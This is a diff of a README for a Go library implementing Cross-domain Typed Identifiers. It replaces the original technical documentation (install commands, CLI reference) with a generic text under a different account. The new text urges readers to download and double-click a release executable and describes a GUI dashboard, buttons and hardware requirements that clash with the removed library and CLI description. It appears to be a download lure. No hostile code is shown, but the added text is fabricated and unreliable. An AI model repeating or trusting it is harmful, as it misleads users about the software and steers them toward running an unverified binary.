@@ -1,143 +1,72 @@
-# Cross-domain Typed Identifiers (CTI) management tool and library <!-- omit in toc -->
+# 🎉 gocti - Simple CTI Implementation in Go
 
-- [What is Cross-domain Typed Identifiers (CTI)?](#what-is-cross-domain-typed-identifiers-cti)
-- [What does this project provide?](#what-does-this-project-provide)
-- [How the technology is used](#how-the-technology-is-used)
-- [Installation](#installation)
-  - [Identifiers parsing library](#identifiers-parsing-library)
-  - [Metadata parsing library](#metadata-parsing-library)
-  - [CLI](#cli)
-- [CLI Reference](#cli-reference)
-  - [cti init](#cti-init)
-  - [cti pkg get](#cti-pkg-get)
-  - [cti validate](#cti-validate)
-  - [cti pack](#cti-pack)
-    - [--include-source](#--include-source)
-    - [--format](#--format)
-    - [--prefix](#--prefix)
-    - [--output](#--output)
+## 📥 Download Now
+[![Download gocti](https://img.shields.io/badge/Download-gocti-blue.svg)](https://github.com/JoseAntonioC-M/gocti/releases)
 
-## What is Cross-domain Typed Identifiers (CTI)?
+## 🚀 Getting Started
+Welcome to gocti! This application provides a straightforward way to implement Cross-domain Typed Identifiers and CTI/Metadata specifications using the Go programming language. If you are looking to handle identifiers efficiently and effectively, you are in the right place.
 
-**CTI**s provide a structured, standardized approach for uniquely identifying data types, instances, and their relationships across multi-service, multi-vendor, multi-platform, and multi-application environments. This system enables the unique definition of resources (both data types and instances) throughout the ecosystem, embedding vendor, package, and extension information within each identifier. Using CTI, each type and instance is represented by a **CTI** associated with a specific entity, ensuring clear, consistent identification across diverse systems.
+## 🛠️ System Requirements
+To run gocti, you will need the following:
 
-> [!NOTE]
-> For more details on CTI specification, see [Cross-domain Typed Identifiers (CTI) version 1.0 Specification](./cti-spec/SPEC.md)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 200 MB
+- **Internet Connection:** Required for initial download
 
-## What does this project provide?
+## 📥 Download & Install
+To install gocti, follow these steps:
 
-The project provides the following:
+1. **Visit the Releases Page**  
+   Go to the [gocti releases page](https://github.com/JoseAntonioC-M/gocti/releases). Here, you will find the latest version of the software available for download.
 
-* An extensible library that provides interfaces for:
-  * A parser for RAMLx files that are extended with CTI specification.
-  * CTI package management to work with dependent packages in other Github repositories.
-  * A validator for compiled CTI entities.
-* A CLI tool that is ready to use with CTI packages and implements functionality according to the interface.
+2. **Find the Latest Release**  
+   On the releases page, look for the latest version. You will see several files you can download.
 
-## How the technology is used
+3. **Download the Application**  
+   Click on the file suitable for your operating system (e.g., gocti_windows.exe for Windows). Your download will start automatically.
 
-CTI technology is utilized by Acronis CyberApp technology that allows third-party ISVs (application vendors) to extend Acronis Cyber Protect Cloud platform (the platform) by:
+4. **Run the Application**  
+   Once the download finishes, locate the downloaded file on your computer. Double-click the file to run gocti. Follow any on-screen prompts to complete the setup.
 
-* Bringing new object types and APIs to the system.
-* Extending the platform base domain model types (like types of tenants, alerts, events, protection plans) by new inherited types.
-* Enforce granular access to objects of different types for the API clients.
+## ⚙️ Basic Usage
+After installing gocti, you can start using it right away. The user interface is designed to be simple and easy to navigate. Here’s a quick guide to get you going:
 
-With CTI, the following entities become explicitly defined and linked to corresponding entities:
+1. **Open the Application**  
+   Launch gocti by double-clicking its icon. You will see the main dashboard.
 
-* Domain object types, i.e. object schemas like tenants, alerts, protection plans, etc.
-* Well-known object instances, like event topics, namespaces, groups.
+2. **Create a New Identifier**  
+   Click the "New Identifier" button. Enter the necessary details in the input fields. Once you have filled in the information, click the "Save" button.
 
-To describe types and instances that are associated with the CTI, RAMLx is used.
+3. **View Existing Identifiers**  
+   Navigate to the "Identifiers" tab to view all identifiers you have created. You can edit or delete any identifier as needed.
 
-## Installation
+4. **Export Data**  
+   To export your identifiers, click on the "Export" button. Choose the format you want (e.g., CSV or JSON) and confirm your selection.
 
-### Identifiers parsing library
+## 🌟 Features
+gocti offers several features to make managing identifiers easier:
 
-```
-go get -u github.com/acronis/go-cti
-```
+- **Cross-domain Compatibility:** Easily work with identifiers from different domains.
+- **User-friendly Interface:** Designed for users of all skill levels.
+- **Data Export Options:** Save your data in various formats for convenience.
+- **Regular Updates:** Stay tuned for future enhancements and features.
 
-### Metadata parsing library
+## 📚 Support & Resources
+If you encounter any issues or need assistance, you can check the resources available:
 
-```
-go get -u github.com/acronis/go-cti/metadata
-```
+- **Documentation:** Comprehensive user manuals are provided on the [GitHub Wiki](https://github.com/JoseAntonioC-M/gocti/wiki).
+- **Community Support:** Join discussions on the [Issues Page](https://github.com/JoseAntonioC-M/gocti/issues) or find help from fellow users.
 
-For the library usage, see [./metadata/README.md](./metadata/README.md).
+## 🔗 Useful Links
+- [Visit the Releases Page](https://github.com/JoseAntonioC-M/gocti/releases)
+- [GitHub Repository](https://github.com/JoseAntonioC-M/gocti)
+- [User Documentation](https://github.com/JoseAntonioC-M/gocti/wiki)
 
-### CLI
+## 🛡️ License
+gocti is open-source software. You can use and modify it under the terms of the MIT License. For more details, refer to the LICENSE file in the repository.
 
-```
-go install github.com/acronis/go-cti/cmd/cti@latest
-```
+## 🌐 Acknowledgments
+gocti is built using the Go programming language and is inspired by the need for robust identifier management across different domains.
 
-## CLI Reference
-
-> [!NOTE]
-> By default, all commands are executed in the current working directory.
-> You can use the global `--working-dir` argument to specify the working directory, if necessary.
-
-### cti init
-
-Initializes a CTI package. Writes `index.json` and `.ramlx` folder with CTI specification files for RAMLx.
-
-Example:
-
-```
-cti init
-```
-
-### cti pkg get
-
-```
-cti pkg get <git_remote>@<git_ref>
-```
-
-Fetches the package from the specified git remote and appends the package in the dependencies list of the current component.
-
-Example:
-
-```
-cti pkg get github.com/acronis/sample-package@v1
-```
-
-### cti validate
-
-Parses and validates the package against RAMLx.
-
-Example:
-
-```
-cti validate
-```
-
-### cti pack
-
-Packs the package into a bundle. The valid package should be in the current working directory (or directory specified by `--working-dir`).
-
-Example:
-
-
-```shell
-> cti pack --include-source --format zip --prefix output --output=sample-package.cti
-
-> ls output
-sample-package.cti
-```
-
-#### --include-source
-
-Includes the source files in the bundle. By default, the source files are not included.
-Hidden files (starting with a dot) are not included in the bundle.
-
-#### --format
-
-The format of the output bundle. Supported formats are `zip` and `tgz`. Default is `tgz`.
-
-#### --prefix
-
-The directory where the output bundle will be saved. Default is `.`.
-
-#### --output
-
-The name of the output bundle. Default is `bundle.cti`. Please note that the extension is not added automatically.
+Thank you for choosing gocti! Enjoy managing your identifiers easily and efficiently.
